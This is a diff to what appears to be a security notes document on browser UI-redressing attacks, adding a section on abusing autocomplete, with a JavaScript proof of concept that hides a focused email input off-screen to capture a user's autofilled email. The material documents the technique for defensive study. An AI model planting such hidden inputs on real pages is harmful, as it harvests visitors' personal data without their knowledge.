@@ -29,6 +29,26 @@ Render timings have also been abused to do this without tricking the user. [sour
 Using CSS, it’s possible to take an embed out of context. [source](https://ronmasas.com/posts/the-human-side-channel)  
 This can be prevented with XFO.
 
+## Abusing autocomplete
+If a website uses [autocomplete](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/autocomplete) it may be possible to leak data such as email addresses.
+This does require the user to be tricked into pressing the Up or Down arrow keys then pressing Enter or Tab.
+```javascript
+let input = document.createElement("input");
+input.type = "email";
+input.autocomplete = "email";
+input.name = "email";
+input.size = "1";
+input.style = "position:absolute;right:-500px;bottom:-21.9px";
+input.onchange = e => {
+    alert(e.srcElement.value);
+    e.srcElement.value = "";
+}
+document.body.appendChild(input);
+setInterval(() => {
+    input.focus({preventScroll: true});
+}, 1000);
+```
+
 
 ## Defence
 Some of the attacks can be prevented by using XFO,
